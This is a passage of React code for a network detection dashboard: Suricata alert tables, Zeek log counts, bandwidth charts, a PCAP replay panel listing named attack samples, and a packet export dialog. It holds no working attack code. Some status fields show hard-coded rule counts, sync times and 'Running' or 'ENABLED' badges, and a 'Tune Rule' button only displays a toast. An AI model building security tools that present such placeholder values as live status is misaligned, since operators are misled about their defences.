      {activeTab === 'suricata' && (
        <div className="flex flex-col gap-6">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Suricata Rules Engine Status Card */}
            <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl flex flex-col justify-between space-y-4">
              <div>
                <div className="flex items-center justify-between border-b border-gray-800 pb-3">
                  <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                    <Shield className="w-4 h-4 text-rose-400" />
                    {isZh ? 'Suricata 7.0.4 引擎狀態' : 'Suricata IDS Status'}
                  </span>
                  <span className="px-2 py-0.5 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded text-[10px] font-bold">
                    Running
                  </span>
                </div>
                <div className="space-y-3 mt-4 text-xs font-mono">
                  <div className="flex justify-between">
                    <span className="text-gray-500">{isZh ? '作用中特徵規則 (ET Pro)' : 'Active Rules'}:</span>
                    <span className="text-white font-bold">
                      {suricataRulesStatus?.activeRules ? `${suricataRulesStatus.activeRules.toLocaleString()} Rules` : '68,419 Rules'}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">{isZh ? '最後特徵庫更新' : 'Last Signature Sync'}:</span>
                    <span className="text-blue-400 font-bold">
                      {suricataRulesStatus?.lastSyncTime ? new Date(suricataRulesStatus.lastSyncTime).toLocaleDateString() + ' ' + new Date(suricataRulesStatus.lastSyncTime).toLocaleTimeString() : '2026-08-20 04:00 (Latest)'}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">{isZh ? '深度封包檢測線程' : 'Inspection Threads'}:</span>
                    <span className="text-white font-bold">16 Cores (Hyperscan JIT)</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">{isZh ? '自動攔截防禦 (IPS)' : 'IPS Drop Mode'}:</span>
                    <span className="text-emerald-400 font-bold">ENABLED (Inline AF_PACKET)</span>
                  </div>
                </div>
              </div>

              <button 
                disabled={isSyncingRules}
                onClick={handleSyncRules}
                className="w-full py-2.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 disabled:opacity-50 text-white rounded-xl text-xs font-black uppercase tracking-wider transition-all flex items-center justify-center gap-2"
              >
                <RefreshCw size={13} className={cn(isSyncingRules && "animate-spin")} />
                <span>{isSyncingRules ? (isZh ? '正在從 ET 雲端特徵庫同步中...' : 'Syncing...') : (isZh ? '立即同步最新威脅特徵庫' : 'Sync Signatures')}</span>
              </button>
            </div>

            {/* Zeek Protocol Analyzers Summary */}
            <div className="lg:col-span-2 bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl space-y-4">
              <div className="flex items-center justify-between border-b border-gray-800 pb-3">
                <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                  <Cpu className="w-4 h-4 text-purple-400" />
                  {isZh ? 'Zeek 協定提取與特徵標籤 (Protocol Extractors)' : 'Zeek Analyzers'}
                </span>
                <span className="text-gray-400 text-xs font-mono">conn.log, http.log, ssl.log, dns.log</span>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
                {[
                  { name: 'TLS / SSL', count: suricataRulesStatus?.suricata?.zeekAnalyzers?.tlsLogs ? `${suricataRulesStatus.suricata.zeekAnalyzers.tlsLogs.toLocaleString()} logs` : '45,210 logs', badge: 'JA3 / SNI Extraction', color: 'text-blue-400' },
                  { name: 'DNS Queries', count: suricataRulesStatus?.suricata?.zeekAnalyzers?.dnsQueries ? `${suricataRulesStatus.suricata.zeekAnalyzers.dnsQueries.toLocaleString()} logs` : '18,400 logs', badge: 'Entropy / DGA Score', color: 'text-purple-400' },
                  { name: 'HTTP Streams', count: suricataRulesStatus?.suricata?.zeekAnalyzers?.httpStreams ? `${suricataRulesStatus.suricata.zeekAnalyzers.httpStreams.toLocaleString()} logs` : '8,920 logs', badge: 'MIME / Header Parse', color: 'text-amber-400' },
                  { name: 'SMB & Kerberos', count: suricataRulesStatus?.suricata?.zeekAnalyzers?.smbAudits ? `${suricataRulesStatus.suricata.zeekAnalyzers.smbAudits.toLocaleString()} logs` : '3,410 logs', badge: 'NTLM / RPC Auditing', color: 'text-emerald-400' }
                ].map((proto, idx) => (
                  <div key={idx} className="bg-[#09090b] border border-gray-800 rounded-2xl p-3 space-y-1">
                    <span className="text-gray-400 font-bold block">{proto.name}</span>
                    <span className={cn("text-base font-black font-mono", proto.color)}>{proto.count}</span>
                    <span className="text-[9px] text-gray-500 block truncate">{proto.badge}</span>
                  </div>
                ))}
              </div>

              <p className="text-[11px] text-gray-400">
                {isZh 
                  ? 'Zeek 引擎會自動將擷取之網路連線抽象化為 Interflow™ 格式，並即時提取 TLS JA3/JA3S 雜湊、DNS TXT 熵值、HTTP 使用者代理與 SMB 檔案存取特徵，無縫同步至 EDR/SIEM 關聯分析。' 
                  : 'Zeek extracts metadata including JA3 hashes, DNS entropy, and HTTP headers into structured Interflow logs.'}
              </p>
            </div>
          </div>

          {/* Suricata Realtime IDS Alerts Table */}
          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3 mb-4">
              <div className="flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-rose-400" />
                <span className="text-xs font-black uppercase tracking-wider text-white">
                  {isZh ? 'Suricata 即時觸發告警事件 (Real-time IDS Alerts)' : 'Suricata IDS Alerts'}
                </span>
                <span className="text-[10px] font-mono bg-rose-600/10 border border-rose-500/30 text-rose-400 px-2 py-0.5 rounded-full">
                  {liveAlerts.length} Triggered
                </span>
              </div>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="text-gray-500 uppercase text-[10px] tracking-wider border-b border-gray-800 pb-3">
                    <th className="pb-3 px-3">{isZh ? '時間' : 'Time'}</th>
                    <th className="pb-3 px-3">SID / REV</th>
                    <th className="pb-3 px-3">{isZh ? '規則簽章名稱 (Signature)' : 'Signature'}</th>
                    <th className="pb-3 px-3">{isZh ? '來源 / 目的' : 'Src -> Dst'}</th>
                    <th className="pb-3 px-3">{isZh ? 'MITRE ATT&CK' : 'MITRE'}</th>
                    <th className="pb-3 px-3">{isZh ? '處置動作' : 'Action'}</th>
                    <th className="pb-3 px-3 text-right">{isZh ? '操作' : 'Action'}</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-800/60">
                  {liveAlerts.map((alert) => (
                    <tr key={alert.id} className="hover:bg-white/5 transition-colors">
                      <td className="py-3 px-3 text-gray-400">{alert.timestamp}</td>
                      <td className="py-3 px-3 text-blue-400 font-bold">{alert.sid}:{alert.rev}</td>
                      <td className="py-3 px-3">
                        <div className="flex flex-col">
                          <span className="font-bold text-white flex items-center gap-1.5">
                            {alert.severity === 'Critical' && <span className="w-2 h-2 rounded-full bg-rose-500" />}
                            {alert.severity === 'High' && <span className="w-2 h-2 rounded-full bg-orange-500" />}
                            {alert.signature}
                          </span>
                          <span className="text-[10px] text-gray-500 truncate max-w-md">{alert.payload_snippet}</span>
                        </div>
                      </td>
                      <td className="py-3 px-3">
                        <div className="flex items-center gap-1 text-[11px]">
                          <span className="text-blue-400 font-bold">{alert.src_ip}</span>
                          <ArrowRight size={10} className="text-gray-600" />
                          <span className="text-emerald-400 font-bold">{alert.dst_ip}</span>
                        </div>
                      </td>
                      <td className="py-3 px-3">
                        <div className="flex flex-col">
                          <span className="text-purple-400 font-bold text-[10px]">{alert.mitre_tactic}</span>
                          <span className="text-[9px] text-gray-500">{alert.mitre_technique}</span>
                        </div>
                      </td>
                      <td className="py-3 px-3">
                        <span className={cn(
                          "px-2 py-0.5 rounded text-[10px] font-black uppercase",
                          alert.action.includes('Blocked') ? "bg-rose-950 text-rose-300 border border-rose-800" : "bg-amber-950 text-amber-300 border border-amber-800"
                        )}>
                          {alert.action}
                        </span>
                      </td>
                      <td className="py-3 px-3 text-right">
                        <button 
                          onClick={() => showToast(isZh ? `已產生針對 SID ${alert.sid} 之客製防禦簽章！` : 'Rule exported')}
                          className="px-2.5 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white rounded-lg text-[10px] font-bold transition-all border border-gray-700"
                        >
                          {isZh ? '規則微調' : 'Tune Rule'}
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* SUBTAB 3: 🌐 即時連線流量拓撲 (TOPOLOGY) */}
      {activeTab === 'topology' && (
        <TrafficD3Topology sessions={liveSessions} isZh={isZh} showToast={showToast} onCaptureNode={handleCaptureNode} />
      )}

      {/* SUBTAB 3.5: 🔥 24 小時流量時態熱力圖 (D3.JS 24-HOUR HEATMAP) */}
      {activeTab === 'heatmap' && (
        <NDRTrafficHeatmap24h isZh={isZh} showToast={showToast} onIsolateHost={handleBlockIp} />
      )}

      {/* SUBTAB 4: 📈 頻寬趨勢與 TOP TALKERS 分析 (BANDWIDTH) */}
      {activeTab === 'bandwidth' && (
        <div className="flex flex-col gap-6">
          {/* 24-Hour D3.js Heatmap for Peak Periods & Anomaly Flow Clusters */}
          <NDRTrafficHeatmap24h isZh={isZh} showToast={showToast} onIsolateHost={handleBlockIp} />

          {/* Bandwidth Area Chart */}
          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl">
            <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-3 border-b border-gray-800">
              <div>
                <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                  <TrendingUp className="w-4 h-4 text-emerald-400" />
                  {isZh ? '24 小時網路進出頻寬吞吐與阻斷流量趨勢' : '24h Network Inbound/Outbound Bandwidth'}
                </span>
                <p className="text-[10px] text-gray-500 mt-0.5">{isZh ? '單位: Mbps (每 3 小時聚合採樣)' : 'Unit: Mbps'}</p>
              </div>

              <div className="flex items-center gap-4 text-xs font-mono">
                <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-sm bg-blue-500" /> Inbound (進站)</span>
                <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-sm bg-emerald-500" /> Outbound (出站)</span>
                <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-sm bg-rose-500" /> Dropped (攔截)</span>
              </div>
            </div>

            <div className="h-64 w-full">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={bandwidthHourly} margin={{ top: 10, right: 10, left: -10, bottom: 0 }}>
                  <defs>
                    <linearGradient id="colorIn" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.3}/>
                      <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                    </linearGradient>
                    <linearGradient id="colorOut" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#10b981" stopOpacity={0.3}/>
                      <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="#222" vertical={false} />
                  <XAxis dataKey="time" stroke="#666" fontSize={10} tickLine={false} />
                  <YAxis stroke="#666" fontSize={10} tickLine={false} />
                  <Tooltip contentStyle={{ backgroundColor: '#09090b', border: '1px solid #333', borderRadius: '12px', fontSize: '11px', fontFamily: 'monospace' }} />
                  <Area type="monotone" dataKey="inbound" stroke="#3b82f6" strokeWidth={2} fillOpacity={1} fill="url(#colorIn)" name="Inbound (Mbps)" />
                  <Area type="monotone" dataKey="outbound" stroke="#10b981" strokeWidth={2} fillOpacity={1} fill="url(#colorOut)" name="Outbound (Mbps)" />
                  <Area type="monotone" dataKey="dropped" stroke="#f43f5e" strokeWidth={2} fillOpacity={0} name="Dropped (Mbps)" />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Top Talkers (Source) + Top Destinations (Destination) */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Top Talkers */}
            <div className="lg:col-span-6 bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl flex flex-col justify-between">
              <div>
                <div className="flex items-center justify-between border-b border-gray-800 pb-3 mb-3">
                  <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                    <Activity className="w-4 h-4 text-blue-400" />
                    {isZh ? 'Top Talkers (來源主機頻寬排名)' : 'Top Talkers (Sources)'}
                  </span>
                  <span className="text-[10px] text-gray-500 font-mono">{isZh ? '依總位元組排序' : 'By Bytes'}</span>
                </div>

                <div className="space-y-3">
                  {topTalkers.map((talker, idx) => (
                    <div key={idx} className="bg-[#09090b] border border-gray-800 rounded-2xl p-3 space-y-1.5">
                      <div className="flex justify-between items-center text-xs">
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-bold text-blue-400">{talker.ip}</span>
                          <span className="text-gray-400 text-[11px]">({talker.name})</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-bold text-white">{talker.traffic}</span>
                          <span className={cn(
                            "text-[9px] px-1.5 py-0.5 rounded uppercase font-black",
                            talker.threat === 'Critical' ? "bg-rose-950 text-rose-400 border border-rose-800" :
                            talker.threat === 'High' ? "bg-orange-950 text-orange-400 border border-orange-800" :
                            "bg-gray-800 text-gray-400"
                          )}>
                            {talker.threat}
                          </span>
                        </div>
                      </div>
                      <div className="w-full h-1.5 bg-gray-900 rounded-full overflow-hidden">
                        <div className="h-full bg-blue-500 rounded-full" style={{ width: `${talker.pct}%` }} />
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Top Destinations + Protocol Breakdown */}
            <div className="lg:col-span-6 bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl flex flex-col justify-between">
              <div>
                <div className="flex items-center justify-between border-b border-gray-800 pb-3 mb-3">
                  <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                    <Globe className="w-4 h-4 text-emerald-400" />
                    {isZh ? 'Top Destinations (目標主機頻寬排名)' : 'Top Destinations'}
                  </span>
                  <span className="text-[10px] text-gray-500 font-mono">{isZh ? '地理 IP 與 ASN' : 'Geo / ASN'}</span>
                </div>

                <div className="space-y-3">
                  {topDestinations.map((dest, idx) => (
                    <div key={idx} className="bg-[#09090b] border border-gray-800 rounded-2xl p-3 flex justify-between items-center text-xs">
                      <div className="flex items-center gap-2.5">
                        <span className="text-base">{dest.flag}</span>
                        <div>
                          <div className="flex items-center gap-1.5">
                            <span className="font-mono font-bold text-emerald-400">{dest.ip}</span>
                            <span className="text-[10px] text-gray-500 font-mono">({dest.asn})</span>
                          </div>
                          <span className="text-[10px] text-gray-400">{dest.name} • {dest.country}</span>
                        </div>
                      </div>
                      <span className="font-mono font-bold text-white text-xs">{dest.bytes}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* SUBTAB 5: 🧪 PCAP 重放與沙盒測試 (REPLAY SIMULATOR) */}
      {activeTab === 'replay' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Left: Replay Controls & Sample Packets */}
          <div className="lg:col-span-5 bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl space-y-5">
            <div>
              <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                <Radio className="w-4 h-4 text-purple-400" />
                {isZh ? 'PCAP 流量重放引擎 (Replay Sandbox)' : 'PCAP Replay Simulator'}
              </span>
              <p className="text-[10px] text-gray-500 mt-1">
                {isZh ? '將歷史 PCAP 封包檔案注入虛擬鏡像介面，即時測試 Suricata 簽章與 NDR 檢測精準度' : 'Inject sample PCAPs to test Suricata signatures'}
              </p>
            </div>

            {/* Built-in Attack PCAP Library */}
            <div className="space-y-2">
              <span className="text-[10px] font-black uppercase text-gray-400 tracking-wider">
                {isZh ? '內建資安攻擊測試流量包 (Preloaded PCAPs)' : 'Attack Samples'}
              </span>
              {[
                { name: 'Log4j_CVE-2021-44228_Exploit', desc: 'JNDI LDAP 注入與混淆攻擊', pkts: '14 pkts', level: 'Critical' },
                { name: 'CobaltStrike_Malleable_C2_TLS', desc: 'TLS 443 自訂憑證心跳信標', pkts: '85 pkts', level: 'Critical' },
                { name: 'EternalBlue_MS17-010_SMB_Probe', desc: 'SMBv1 漏洞掃描與溢位測試', pkts: '120 pkts', level: 'High' },
                { name: 'DNS_Tunneling_Data_Exfil', desc: 'Base64 TXT 記錄機敏資料隱匿', pkts: '42 pkts', level: 'High' }
              ].map((sample, sidx) => (
                <div 
                  key={sidx}
                  className="bg-[#09090b] hover:bg-gray-900 border border-gray-800/80 rounded-2xl p-3 flex items-center justify-between group transition-colors"
                >
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-bold text-white group-hover:text-blue-400 font-mono transition-colors">
                        {sample.name}
                      </span>
                      <span className={cn(
                        "text-[9px] px-1.5 rounded uppercase font-black",
                        sample.level === 'Critical' ? "bg-rose-950 text-rose-400" : "bg-orange-950 text-orange-400"
                      )}>
                        {sample.level}
                      </span>
                    </div>
                    <p className="text-[10px] text-gray-500 mt-0.5">{sample.desc} • {sample.pkts}</p>
                  </div>

                  <button
                    disabled={isReplaying}
                    onClick={() => startPcapReplay(sample.name)}
                    className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 disabled:opacity-30 text-white rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1 shadow-md shadow-blue-600/20"
                  >
                    <Play size={10} className="fill-current" /> {isZh ? '重放' : 'Replay'}
                  </button>
                </div>
              ))}
            </div>

            {/* Custom Upload Box */}
            <label className="border-2 border-dashed border-gray-800 hover:border-blue-500/50 rounded-2xl p-5 text-center cursor-pointer transition-colors space-y-2 bg-[#09090b] block group">
              <input 
                type="file" 
                accept=".pcap,.pcapng,.cap" 
                className="hidden" 
                onChange={(e) => {
                  const file = e.target.files?.[0];
                  if (file) {
                    showToast(isZh ? `已載入自訂封包檔 ${file.name}，正在啟動沙盒測試...` : `Loaded ${file.name}, starting replay...`);
                    startPcapReplay(file.name.replace(/\.[^/.]+$/, ''));
                  }
                }}
              />
              <Upload className="w-6 h-6 text-gray-500 group-hover:text-blue-400 mx-auto transition-colors" />
              <div>
                <p className="text-xs font-bold text-gray-300 group-hover:text-white transition-colors">
                  {isZh ? '點擊或拖曳上傳 .pcap / .pcapng 檔案' : 'Upload custom PCAP'}
                </p>
                <p className="text-[10px] text-gray-600 mt-0.5">{isZh ? '最大支援 500 MB 封包檔案，即時注入虛擬 TAP 介面' : 'Max 500MB, injected into virtual TAP'}</p>
              </div>
            </label>
          </div>

          {/* Right: Replay Console & Inspection Output */}
          <div className="lg:col-span-7 bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl flex flex-col justify-between space-y-4">
            <div>
              <div className="flex items-center justify-between border-b border-gray-800 pb-3">
                <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-emerald-400" />
                  {isZh ? '重放沙盒即時終端 (Sandbox Execution Log)' : 'Execution Logs'}
                </span>
                <span className="text-[10px] font-mono text-gray-500">tcpreplay --intf=tap0</span>
              </div>

              {/* Progress Bar */}
              {isReplaying && (
                <div className="mt-3 space-y-1">
                  <div className="flex justify-between text-[10px] font-mono text-gray-400">
                    <span>{isZh ? '重放進度' : 'Progress'}</span>
                    <span className="text-blue-400 font-bold">{replayProgress}%</span>
                  </div>
                  <div className="w-full h-2 bg-gray-900 rounded-full overflow-hidden">
                    <div className="h-full bg-blue-500 transition-all duration-300" style={{ width: `${replayProgress}%` }} />
                  </div>
                </div>
              )}

              {/* Console Output Area */}
              <div className="mt-4 bg-black/70 rounded-2xl border border-gray-800/80 p-4 font-mono text-xs text-gray-300 space-y-1.5 h-80 overflow-y-auto custom-scrollbar shadow-inner">
                {replayLogOutput.length === 0 ? (
                  <div className="h-full flex flex-col items-center justify-center text-gray-600 text-center">
                    <Radio size={24} className="mb-2 opacity-40 animate-pulse" />
                    <p className="text-xs">{isZh ? '請選擇左側 PCAP 樣本以啟動流量重放與沙盒測試' : 'Select a PCAP from the left to start replay simulation'}</p>
                  </div>
                ) : (
                  replayLogOutput.map((log, lidx) => (
                    <div key={lidx} className={cn(
                      "leading-relaxed",
                      log.includes('[SURICATA]') ? "text-rose-400 font-bold" :
                      log.includes('[ZEEK]') ? "text-purple-400 font-bold" :
                      log.includes('[COMPLETE]') ? "text-emerald-400 font-bold" :
                      "text-gray-400"
                    )}>
                      {log}
                    </div>
                  ))
                )}
              </div>
            </div>

            <div className="flex items-center justify-between text-xs text-gray-500 border-t border-gray-800/80 pt-3">
              <span>{isZh ? '沙盒介面' : 'Interface'}: <strong className="text-gray-300">veth-sandbox-tap0</strong></span>
              <span>{isZh ? '虛擬延遲' : 'Simulated Latency'}: <strong className="text-emerald-400">0.05 ms</strong></span>
            </div>
          </div>
        </div>
      )}

      {/* MODAL: FULL HEX INSPECTOR */}
      <AnimatePresence>
        {selectedSessionForModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-[#111114] border border-gray-800 rounded-3xl w-full max-w-3xl overflow-hidden shadow-2xl flex flex-col"
            >
              <div className="p-5 border-b border-gray-800 flex items-center justify-between">
                <div>
                  <h3 className="text-base font-black text-white font-mono flex items-center gap-2">
                    <Code className="text-blue-400" />
                    {selectedSessionForModal.stream_id} - {selectedSessionForModal.proto}
                  </h3>
                  <p className="text-xs text-gray-400 mt-0.5">
                    {selectedSessionForModal.src_ip}:{selectedSessionForModal.src_port} -&gt; {selectedSessionForModal.dst_ip}:{selectedSessionForModal.dst_port}
                  </p>
                </div>
                <button onClick={() => setSelectedSessionForModal(null)} className="p-2 hover:bg-gray-800 rounded-xl text-gray-400 hover:text-white">
                  <X size={16} />
                </button>
              </div>

              <div className="p-6 space-y-4 max-h-[60vh] overflow-y-auto custom-scrollbar">
                <div className="bg-black/80 rounded-2xl p-4 border border-gray-800 font-mono text-xs text-gray-300 space-y-1">
                  {selectedSessionForModal.hex_dump.map((h, idx) => (
                    <div key={idx} className="flex gap-4">
                      <span className="text-blue-400 font-bold">{h.offset}</span>
                      <span className="text-gray-300">{h.hex}</span>
                      <span className="text-purple-400 font-bold">{h.ascii}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="p-4 border-t border-gray-800 bg-[#09090b] flex flex-wrap items-center justify-between gap-3">
                <div className="flex items-center gap-2">
                  <button 
                    onClick={() => handleExportTraffic([selectedSessionForModal], 'pcapng')}
                    className="px-3.5 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-bold flex items-center gap-1.5 transition-all shadow-md shadow-blue-600/20"
                    title={isZh ? '匯出此連線為 Wireshark .pcapng 封包' : 'Export this stream as Wireshark .pcapng'}
                  >
                    <FileDown size={13} /> {isZh ? '匯出 Wireshark 封包 (.pcapng)' : 'Export as .pcapng'}
                  </button>
                  <button 
                    onClick={() => handleExportTraffic([selectedSessionForModal], 'pcap')}
                    className="px-3.5 py-2 bg-gray-800 hover:bg-gray-700 text-gray-200 hover:text-white rounded-xl text-xs font-bold flex items-center gap-1.5 border border-gray-700 transition-all"
                    title={isZh ? '匯出此連線為標準 Libpcap .pcap 封包' : 'Export this stream as Libpcap .pcap'}
                  >
                    <Download size={13} /> {isZh ? '匯出標準 .pcap' : 'Export as .pcap'}
                  </button>
                </div>
                <button 
                  onClick={() => setSelectedSessionForModal(null)}
                  className="px-4 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-xl text-xs font-bold transition-colors"
                >
                  {isZh ? '關閉視窗' : 'Close'}
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* MODAL: EXPORT FILTERED TRAFFIC TO PCAP / PCAPNG */}
      <AnimatePresence>
        {isExportModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
            <motion.div
              initial={{ scale: 0.95, opacity: 0, y: 15 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.95, opacity: 0, y: 15 }}
              className="bg-[#111114] border border-gray-800 rounded-3xl w-full max-w-2xl overflow-hidden shadow-2xl flex flex-col"
            >
              {/* Header */}
              <div className="p-5 border-b border-gray-800 flex items-center justify-between bg-gradient-to-r from-blue-950/30 via-transparent to-purple-950/20">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-2xl bg-blue-600/10 border border-blue-500/20 flex items-center justify-center text-blue-400">
                    <FileDown size={20} />
                  </div>
                  <div>
                    <h3 className="text-base font-black text-white flex items-center gap-2">
                      {isZh ? '匯出連線流量與鑑識封包檔案 (PCAP / PCAPNG / CSV)' : 'Export Traffic Capture & Forensic Log (.pcap / .pcapng / .csv)'}
                      <span className="text-[10px] font-mono font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                        Wireshark &amp; SIEM Ready
                      </span>
                    </h3>
                    <p className="text-xs text-gray-400">
                      {isZh 
                        ? '支援 RFC 標準二進位封包檔 (Libpcap/PCAPNG) 與 RFC 4180 CSV 鑑識串流數據 (5-Tuple, JA3, 協定與 Payload 摘要)' 
                        : 'RFC-compliant packet captures (Libpcap/PCAPNG) and RFC 4180 forensic CSV logs with 5-tuple, JA3, and payload synopsis'}
                    </p>
                  </div>
                </div>
                <button 
                  onClick={() => setIsExportModalOpen(false)}
                  className="p-1.5 hover:bg-gray-800 rounded-xl text-gray-400 hover:text-white transition-colors"
                >
                  <X size={18} />
                </button>
              </div>

              {/* Body */}
              <div className="p-6 space-y-5 max-h-[75vh] overflow-y-auto custom-scrollbar">
                {/* 1. Scope Selection */}
                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-wider text-gray-400 flex items-center gap-1.5">
                    <Filter size={12} className="text-blue-400" />
                    {isZh ? '1. 選擇匯出連線範圍 (Capture Scope)' : '1. Select Capture Scope'}
                  </label>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-xs font-mono">
                    <button
                      type="button"
                      onClick={() => setExportScope('filtered')}
                      className={cn(
                        "p-3 rounded-2xl border text-left transition-all flex flex-col justify-between gap-1",
                        exportScope === 'filtered' 
                          ? "bg-blue-600/10 border-blue-500 text-white shadow-sm" 
                          : "bg-[#09090b] border-gray-800 text-gray-400 hover:border-gray-700 hover:text-gray-200"
                      )}
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-[11px] text-blue-400">
                          {isZh ? '目前篩選條件' : 'Filtered Sessions'}
                        </span>
                        {exportScope === 'filtered' && <Check size={14} className="text-blue-400" />}
                      </div>
                      <span className="text-base font-black text-white">{filteredSessions.length}</span>
                      <span className="text-[10px] text-gray-500 truncate">
                        {pcapFilterQuery ? `BPF: "${pcapFilterQuery}"` : `${selectedProtoFilter} / ${selectedThreatFilter}`}
                      </span>
                    </button>

                    <button
                      type="button"
                      onClick={() => setExportScope('all')}
                      className={cn(
                        "p-3 rounded-2xl border text-left transition-all flex flex-col justify-between gap-1",
                        exportScope === 'all' 
                          ? "bg-blue-600/10 border-blue-500 text-white shadow-sm" 
                          : "bg-[#09090b] border-gray-800 text-gray-400 hover:border-gray-700 hover:text-gray-200"
                      )}
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-[11px] text-purple-400">
                          {isZh ? '所有快取連線' : 'All Buffer'}
                        </span>
                        {exportScope === 'all' && <Check size={14} className="text-blue-400" />}
                      </div>
                      <span className="text-base font-black text-white">{liveSessions.length}</span>
                      <span className="text-[10px] text-gray-500">
                        {isZh ? '完整環形快取緩衝區' : 'Full ring buffer'}
                      </span>
                    </button>

                    <button
                      type="button"
                      onClick={() => setExportScope('selected')}
                      disabled={expandedSessionId === null}
                      className={cn(
                        "p-3 rounded-2xl border text-left transition-all flex flex-col justify-between gap-1",
                        expandedSessionId === null ? "opacity-40 cursor-not-allowed" : "",
                        exportScope === 'selected' 
                          ? "bg-blue-600/10 border-blue-500 text-white shadow-sm" 
                          : "bg-[#09090b] border-gray-800 text-gray-400 hover:border-gray-700 hover:text-gray-200"
                      )}
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-[11px] text-amber-400">
                          {isZh ? '單一選定連線' : 'Selected Stream'}
                        </span>
                        {exportScope === 'selected' && <Check size={14} className="text-blue-400" />}
                      </div>
                      <span className="text-xs font-black text-white truncate">
                        {expandedSessionId ? liveSessions.find(s => s.id === expandedSessionId)?.stream_id : 'None'}
                      </span>
                      <span className="text-[10px] text-gray-500">
                        {expandedSessionId ? liveSessions.find(s => s.id === expandedSessionId)?.proto : 'Select row first'}
                      </span>
                    </button>
                  </div>
                </div>

                {/* 2. Format Selection Cards */}
                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-wider text-gray-400 flex items-center gap-1.5">
                    <FileCode size={12} className="text-purple-400" />
                    {isZh ? '2. 匯出檔案格式規格 (Export Format Specification)' : '2. File Format Specification'}
                  </label>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    {/* PCAPNG */}
                    <div 
                      onClick={() => setExportFormat('pcapng')}
                      className={cn(
                        "p-3.5 rounded-2xl border cursor-pointer transition-all relative flex flex-col justify-between gap-2",
                        exportFormat === 'pcapng'
                          ? "bg-blue-600/10 border-blue-500 shadow-md shadow-blue-500/10"
                          : "bg-[#09090b] border-gray-800 hover:border-gray-700 text-gray-400"
                      )}
                    >
                      <div className="flex items-start justify-between">
                        <div>
                          <div className="flex items-center gap-1.5">
                            <span className="text-sm font-black text-white font-mono">.pcapng</span>
